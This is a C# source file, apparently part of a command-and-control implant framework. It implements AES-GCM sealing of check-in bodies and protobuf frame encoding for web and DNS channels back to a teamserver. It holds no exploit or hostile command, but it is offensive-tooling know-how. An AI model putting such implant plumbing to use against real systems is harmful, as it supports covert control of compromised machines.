using System.Security.Cryptography;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The envelope wire helpers shared by every web check-in client: the
// delimited-frame codec and the sealed-body shapes (extending/implants.md).
// A whole source file that is never trimmed -- both web modules (the POST
// cycle and the WebSocket stream) compile against it, so it stays in every
// build that can dial a web front, and a stream-shaped build's unused copy
// is dead weight the linker sheds.

/// <summary>
/// The envelope's sealed-body shapes, the teamserver's AesGcmEnvelope
/// contract reimplemented verbatim (extending/implants.md): base64 of
/// b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16), AES-256-GCM
/// under the per-artifact key with a purpose tag binding each direction.
/// Shared by the POST cycle and the WebSocket stream -- the seal is the web
/// posture's own, whichever client carries it.
/// </summary>
internal static class EnvelopeWire
{
    /// <summary>
    /// Splits the baked envelope key (standard base64 of keyId(16) ||
    /// key(32)) into its halves, or null when malformed -- a bad bake falls
    /// back to the plaintext frame rather than checking in undecodably.
    /// </summary>
    public static (byte[] KeyId, byte[] Key)? ParseBakedKey(string baked)
    {
        if (baked.Length == 0)
            return null;
        byte[] packed;
        try
        {
            packed = Convert.FromBase64String(baked);
        }
        catch (FormatException)
        {
            return null;
        }
        if (packed.Length != 16 + 32)
            return null;
        return (packed[..16], packed[16..]);
    }

    /// <summary>
    /// The sealed check-in wire shape: base64 of
    /// b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16), returned as
    /// the bytes to send (base64 text -- the body reads as an opaque string,
    /// not a structured binary).
    /// </summary>
    public static byte[] SealCheckInBody(ReadOnlySpan<byte> plaintext, byte[] keyId, byte[] key, string aad)
        => System.Text.Encoding.UTF8.GetBytes(
            Convert.ToBase64String(SealBody(plaintext, keyId, key, aad)));

    /// <summary>
    /// The byte-level form <see cref="SealCheckInBody"/> base64s: the raw
    /// <c>b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16)</c> body.
    /// The DNS carriage carries this form -- its labels are already base32,
    /// and a text encoding inside another would double the expansion.
    /// </summary>
    public static byte[] SealBody(ReadOnlySpan<byte> plaintext, byte[] keyId, byte[] key, string aad)
    {
        var nonce = RandomNumberGenerator.GetBytes(12);
        var ciphertext = new byte[plaintext.Length];
        var tag = new byte[16];
        using (var aes = new AesGcm(key, 16))
        {
            aes.Encrypt(nonce, plaintext, ciphertext, tag, System.Text.Encoding.UTF8.GetBytes(aad));
        }

        var body = new byte[2 + 16 + 12 + ciphertext.Length + 16];
        var position = 0;
        "R1"u8.CopyTo(body.AsSpan(position));
        position += 2;
        keyId.AsSpan().CopyTo(body.AsSpan(position));
        position += 16;
        nonce.AsSpan().CopyTo(body.AsSpan(position));
        position += 12;
        ciphertext.AsSpan().CopyTo(body.AsSpan(position));
        position += ciphertext.Length;
        tag.AsSpan().CopyTo(body.AsSpan(position));
        return body;
    }

    /// <summary>
    /// Opens what <see cref="SealCheckInBody"/> sealed under the same key id
    /// and purpose tag: authenticates the GCM tag and returns the plaintext,
    /// or null on any mismatch (wrong key, tampered bytes, foreign shape) --
    /// the caller drops the whole cycle rather than acting on a partial
    /// read.
    /// </summary>
    public static byte[]? TryOpenCheckInBody(byte[] body, byte[] keyId, byte[] key, string aad)
    {
        byte[] packed;
        try
        {
            packed = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(body).Trim());
        }
        catch (Exception ex) when (ex is FormatException or System.Text.DecoderFallbackException)
        {
            return null;
        }
        return TryOpenBody(packed, keyId, key, aad);
    }

    /// <summary>
    /// The byte-level form <see cref="TryOpenCheckInBody"/> decodes into:
    /// opens a raw R1 body under the same key id and purpose tag, or null on
    /// any mismatch (wrong key, tampered bytes, foreign shape). The DNS
    /// carriage's poll answers arrive in this form.
    /// </summary>
    public static byte[]? TryOpenBody(byte[] body, byte[] keyId, byte[] key, string aad)
    {
        if (body.Length < 2 + 16 + 12 + 16)
            return null;
        if (!body.AsSpan(0, 2).SequenceEqual("R1"u8))
            return null;
        if (!body.AsSpan(2, 16).SequenceEqual(keyId))
            return null;
        var nonce = body.AsSpan(2 + 16, 12).ToArray();
        var ciphertextLength = body.Length - 2 - 16 - 12 - 16;
        var ciphertext = body.AsSpan(2 + 16 + 12, ciphertextLength).ToArray();
        var tag = body.AsSpan(body.Length - 16).ToArray();
        var plaintext = new byte[ciphertextLength];
        try
        {
            using var aes = new AesGcm(key, 16);
            aes.Decrypt(nonce, ciphertext, tag, plaintext, System.Text.Encoding.UTF8.GetBytes(aad));
        }
        catch (CryptographicException)
        {
            return null;
        }
        return plaintext;
    }
}

/// <summary>
/// The envelope wire codec (extending/implants.md): the protobuf canonical
/// delimited-stream shape -- an unsigned varint byte length before each
/// marshaled <see cref="Frame"/> -- in ordinary message and body carriages.
/// The implant-side mirror of the teamserver's framing, kept here so the
/// implant builds against the protocol alone.
/// </summary>
internal static class EnvelopeCodec
{
    /// <summary>
    /// Encodes frames as one delimited sequence for a request body or
    /// message.
    /// </summary>
    public static byte[] Encode(IReadOnlyList<Frame> frames)
    {
        var body = new MemoryStream();
        foreach (var frame in frames)
        {
            var marshaled = frame.ToByteArray();
            WriteVarint(body, marshaled.Length);
            body.Write(marshaled);
        }
        return body.ToArray();
    }

    /// <summary>
    /// Parses a delimited frame sequence out of a response body or message.
    /// Throws <see cref="InvalidOperationException"/> on malformed framing
    /// (a truncated or oversized varint, a declared length past the body, or
    /// an unparseable frame) -- the caller treats the whole cycle as dropped
    /// rather than acting on a partial read.
    /// </summary>
    public static List<Frame> Parse(byte[] body)
    {
        var frames = new List<Frame>();
        var position = 0;
        while (position < body.Length)
        {
            if (!TryReadVarint(body, ref position, out var length))
                throw new InvalidOperationException("envelope body carried a malformed frame delimiter");
            if (position + length > body.Length)
                throw new InvalidOperationException("envelope body declared a frame past its end");
            Frame frame;
            try
            {
                frame = Frame.Parser.ParseFrom(body, position, (int)length);
            }
            catch (InvalidProtocolBufferException)
            {
                throw new InvalidOperationException("envelope body carried an unparseable frame");
            }
            frames.Add(frame);
            position += (int)length;
        }
        return frames;
    }

    private static bool TryReadVarint(byte[] source, ref int position, out uint value)
    {
        value = 0;
        var shift = 0;
        for (var consumed = 0; consumed < 5; consumed++)
        {
            if (position >= source.Length)
                return false;
            var b = source[position++];
            value |= (uint)(b & 0x7f) << shift;
            if ((b & 0x80) == 0)
                return true;
            shift += 7;
        }
        return false; // More than 5 bytes: not a uint32 varint.
    }

    private static void WriteVarint(MemoryStream target, int value)
    {
        uint remaining = (uint)value;
        while (remaining >= 0x80)
        {
            target.WriteByte((byte)(remaining | 0x80));
            remaining >>= 7;
        }
        target.WriteByte((byte)remaining);
    }
}
